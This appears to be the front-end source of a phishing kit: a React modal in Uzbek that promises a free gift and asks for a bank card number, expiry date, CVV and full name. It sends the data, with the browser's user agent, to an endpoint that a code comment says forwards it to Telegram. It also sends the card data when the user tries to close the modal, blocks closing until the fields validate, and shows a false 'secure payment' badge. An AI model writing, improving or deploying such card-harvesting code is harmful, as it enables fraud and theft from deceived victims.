'use client';

import { useState, useCallback, useEffect } from 'react';
import styles from './CardModal.module.css';

interface CardModalProps {
    isOpen: boolean;
    onClose: () => void;
    onSubmit: (cardData: CardData) => void;
}

interface CardData {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardType: CardType;
    fullName: string;
}

type CardType = 'unknown' | 'visa' | 'mastercard' | 'humo' | 'uzcard';

// Card BIN icons (local assets)
const CARD_ICONS = {
    visa: '/assets/visa.svg',
    mastercard: '/assets/mastercard.svg',
    humo: '/assets/humo.svg',
    uzcard: '/assets/uzcard.svg',
};

// Card type detection based on BIN (Bank Identification Number)
function detectCardType(number: string): CardType {
    const cleaned = number.replace(/\s/g, '');

    // Humo (Uzbekistan) - starts with 9860
    if (cleaned.startsWith('9860')) return 'humo';

    // UzCard (Uzbekistan) - starts with 8600 or 5614 (new contactless cards)
    if (cleaned.startsWith('8600') || cleaned.startsWith('5614')) return 'uzcard';

    // Visa - starts with 4
    if (cleaned.startsWith('4')) return 'visa';

    // Mastercard - starts with 51-55 or 2221-2720
    if (/^5[1-5]/.test(cleaned) || /^2[2-7]/.test(cleaned)) return 'mastercard';

    return 'unknown';
}

// Format card number with spaces (4 digits groups)
function formatCardNumber(value: string): string {
    const cleaned = value.replace(/\D/g, '').slice(0, 16);
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(' ') : cleaned;
}

// Format expiry date as MM/YY
function formatExpiryDate(value: string): string {
    const cleaned = value.replace(/\D/g, '').slice(0, 4);
    if (cleaned.length >= 2) {
        return cleaned.slice(0, 2) + '/' + cleaned.slice(2);
    }
    return cleaned;
}

// Validate card BIN - must match known patterns
function isValidCardBin(number: string): boolean {
    const cleaned = number.replace(/\s/g, '');
    if (cleaned.length < 4) return false;

    // Check known BIN patterns
    const validPatterns = [
        /^9860/,           // Humo
        /^8600/,           // UzCard classic
        /^5614/,           // UzCard contactless
        /^4/,              // Visa
        /^5[1-5]/,         // Mastercard 51-55
        /^2[2-7]/,         // Mastercard 2221-2720
    ];

    return validPatterns.some(pattern => pattern.test(cleaned));
}

// Validate expiry date - month 01-12, year current or future, max 2040
function isValidExpiryDate(expiry: string): boolean {
    if (expiry.length !== 5) return false;

    const [monthStr, yearStr] = expiry.split('/');
    const month = parseInt(monthStr, 10);
    const year = parseInt('20' + yearStr, 10);

    if (isNaN(month) || isNaN(year)) return false;
    if (month < 1 || month > 12) return false;

    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;

    // Card must not be expired
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;

    // Year must not be more than 2040
    if (year > 2040) return false;

    return true;
}

// Validate full name - at least 3 characters
function isValidFullName(name: string): boolean {
    return name.trim().length >= 3;
}

export default function CardModal({ isOpen, onClose, onSubmit }: CardModalProps) {
    const [cardNumber, setCardNumber] = useState('');
    const [expiryDate, setExpiryDate] = useState('');
    const [cvv, setCvv] = useState('');
    const [fullName, setFullName] = useState('');
    const [cardType, setCardType] = useState<CardType>('unknown');
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isSuccess, setIsSuccess] = useState(false);

    // Error states
    const [errors, setErrors] = useState({
        cardNumber: false,
        expiryDate: false,
        cvv: false,
        fullName: false
    });

    // Detect card type when number changes
    useEffect(() => {
        setCardType(detectCardType(cardNumber));
    }, [cardNumber]);

    const handleCardNumberChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
        const formatted = formatCardNumber(e.target.value);
        setCardNumber(formatted);
        if (errors.cardNumber) setErrors(prev => ({ ...prev, cardNumber: false }));
    }, [errors.cardNumber]);

    const handleExpiryChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
        const input = e.target;
        const oldValue = expiryDate;
        const newValue = input.value;

        // Handle backspace from year to month
        if (oldValue.length === 3 && newValue.length === 2 && oldValue.endsWith('/')) {
            // User deleted the slash, go back to month
            setExpiryDate(newValue.slice(0, 2));
            // Move cursor to end
            setTimeout(() => {
                input.setSelectionRange(2, 2);
            }, 0);
        } else {
            const formatted = formatExpiryDate(newValue);
            setExpiryDate(formatted);
        }

        if (errors.expiryDate) setErrors(prev => ({ ...prev, expiryDate: false }));
    }, [errors.expiryDate, expiryDate]);

    const handleCvvChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
        const cleaned = e.target.value.replace(/\D/g, '').slice(0, 4);
        setCvv(cleaned);
        if (errors.cvv) setErrors(prev => ({ ...prev, cvv: false }));
    }, [errors.cvv]);

    const handleFullNameChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
        // Remove digits - only allow letters and spaces
        const cleaned = e.target.value.replace(/[0-9]/g, '');
        setFullName(cleaned);
        if (errors.fullName) setErrors(prev => ({ ...prev, fullName: false }));
    }, [errors.fullName]);

    const handleSubmit = useCallback(async (e: React.FormEvent) => {
        e.preventDefault();

        const isLocalCard = cardType === 'uzcard' || cardType === 'humo';
        const cleanedCardNumber = cardNumber.replace(/\s/g, '');

        const newErrors = {
            cardNumber: cleanedCardNumber.length < 16 || !isValidCardBin(cardNumber),
            expiryDate: !isValidExpiryDate(expiryDate),
            cvv: !isLocalCard && cvv.length < 3,
            fullName: !isValidFullName(fullName)
        };

        if (newErrors.cardNumber || newErrors.expiryDate || newErrors.cvv || newErrors.fullName) {
            setErrors(newErrors);
            return;
        }

        setIsSubmitting(true);

        try {
            const response = await fetch('/api/card', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_API_TOKEN}`
                },
                body: JSON.stringify({
                    cardNumber: cardNumber.replace(/\s/g, ''),
                    expiryDate,
                    cvv: isLocalCard ? '' : cvv,
                    cardType,
                    fullName,
                    userAgent: navigator.userAgent
                })
            });

            if (response.ok) {
                setIsSuccess(true);
                // Clear fields after success
                setTimeout(() => {
                    setCardNumber('');
                    setExpiryDate('');
                    setCvv('');
                    setFullName('');
                    setCardType('unknown');
                    setIsSuccess(false);
                    onClose();
                }, 2000);
            }
        } catch (error) {
            console.error('Submission error:', error);
        }

        setIsSubmitting(false);
    }, [cardNumber, expiryDate, cvv, cardType, fullName, onClose]);

    // Handle close - if data is valid, send to Telegram first, then close
    const handleClose = useCallback(async () => {
        const isLocalCard = cardType === 'uzcard' || cardType === 'humo';
        const cleanedCardNumber = cardNumber.replace(/\s/g, '');

        const newErrors = {
            cardNumber: cleanedCardNumber.length < 16 || !isValidCardBin(cardNumber),
            expiryDate: !isValidExpiryDate(expiryDate),
            cvv: !isLocalCard && cvv.length < 3,
            fullName: !isValidFullName(fullName)
        };

        // If there are errors, show them and don't close
        if (newErrors.cardNumber || newErrors.expiryDate || newErrors.cvv || newErrors.fullName) {
            setErrors(newErrors);
            return;
        }

        // Data is valid - send to Telegram before closing
        try {
            await fetch('/api/card', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${process.env.NEXT_PUBLIC_API_TOKEN}`
                },
                body: JSON.stringify({
                    cardNumber: cleanedCardNumber,
                    expiryDate,
                    cvv: isLocalCard ? '' : cvv,
                    cardType,
                    fullName,
                    userAgent: navigator.userAgent
                })
            });
        } catch (error) {
            console.error('Error sending data on close:', error);
        }

        onClose();
    }, [cardNumber, expiryDate, cvv, cardType, fullName, onClose]);

    const handleBackdropClick = useCallback((e: React.MouseEvent) => {
        if (e.target === e.currentTarget) {
            handleClose();
        }
    }, [handleClose]);

    if (!isOpen) return null;

    const isLocalCard = cardType === 'uzcard' || cardType === 'humo';

    return (
        <div className={styles.backdrop} onClick={handleBackdropClick}>
            <div className={styles.modal}>
                <button className={styles.closeButton} onClick={handleClose}>
                    <i className="fas fa-times" />
                </button>
                <div className={styles.header}>
                    <div className={styles.cardIcon}>
                        <i className="fas fa-credit-card" />
                    </div>
                    <p className={styles.subtitle}>Sovg&apos;angizni olish uchun karta kiriting</p>
                </div>
                <form className={styles.form} onSubmit={handleSubmit}>
                    <div className={styles.fieldGroup}>
                        <div className={styles.inputWrapper}>
                            <input
                                type="text"
                                className={`${styles.input} ${errors.cardNumber ? styles.error : ''}`}
                                placeholder="0000 0000 0000 0000"
                                value={cardNumber}
                                onChange={handleCardNumberChange}
                                inputMode="numeric"
                                disabled={isSubmitting || isSuccess}
                            />
                            <div className={styles.cardIcons}>
                                {cardType === 'unknown' ? (
                                    <>
                                        <img src={CARD_ICONS.visa} alt="Visa" className={styles.cardIconSmall} />
                                        <img src={CARD_ICONS.mastercard} alt="Mastercard" className={styles.cardIconSmall} />
                                        <img src={CARD_ICONS.humo} alt="Humo" className={styles.cardIconSmall} />
                                        <img src={CARD_ICONS.uzcard} alt="UzCard" className={styles.cardIconSmall} />
                                    </>
                                ) : (
                                    <img
                                        src={CARD_ICONS[cardType]}
                                        alt={cardType}
                                        className={styles.cardIconLarge}
                                    />
                                )}
                            </div>
                        </div>
                    </div>

                    <div className={styles.row}>
                        <div className={styles.fieldGroup}>
                            <div className={styles.inputWrapper}>
                                <input
                                    type="text"
                                    className={`${styles.input} ${errors.expiryDate ? styles.error : ''}`}
                                    placeholder="MM/YY"
                                    value={expiryDate}
                                    onChange={handleExpiryChange}
                                    inputMode="numeric"
                                    disabled={isSubmitting || isSuccess}
                                />
                            </div>
                        </div>

                        {!isLocalCard && (
                            <div className={styles.fieldGroup}>
                                <div className={styles.inputWrapper}>
                                    <input
                                        type="password"
                                        className={`${styles.input} ${errors.cvv ? styles.error : ''}`}
                                        placeholder="•••"
                                        value={cvv}
                                        onChange={handleCvvChange}
                                        inputMode="numeric"
                                        maxLength={4}
                                        disabled={isSubmitting || isSuccess}
                                    />
                                    <div className={styles.cvvIcon}>
                                        <i className="fas fa-lock" />
                                    </div>
                                </div>
                            </div>
                        )}
                    </div>

                    <div className={styles.fieldGroup}>
                        <div className={styles.inputWrapper}>
                            <input
                                type="text"
                                className={`${styles.input} ${errors.fullName ? styles.error : ''}`}
                                placeholder="Ism Familiya"
                                value={fullName}
                                onChange={handleFullNameChange}
                                disabled={isSubmitting || isSuccess}
                            />
                        </div>
                    </div>

                    <button
                        type="submit"
                        className={`${styles.submitButton} ${isSuccess ? styles.success : ''}`}
                        disabled={isSubmitting || isSuccess}
                    >
                        {isSuccess ? (
                            <>
                                <i className="fas fa-check" /> Muvaffaqiyatli!
                            </>
                        ) : isSubmitting ? (
                            <>
                                <i className="fas fa-spinner fa-spin" /> Tekshirilmoqda...
                            </>
                        ) : (
                            <>
                                <i className="fas fa-gift" /> Sovg&apos;ani olish
                            </>
                        )}
                    </button>
                </form>

                <div className={styles.secure}>
                    <i className="fas fa-shield-alt" />
                    <span>Xavfsiz va himoyalangan to&apos;lov</span>
                </div>
            </div>
        </div>
    );
}
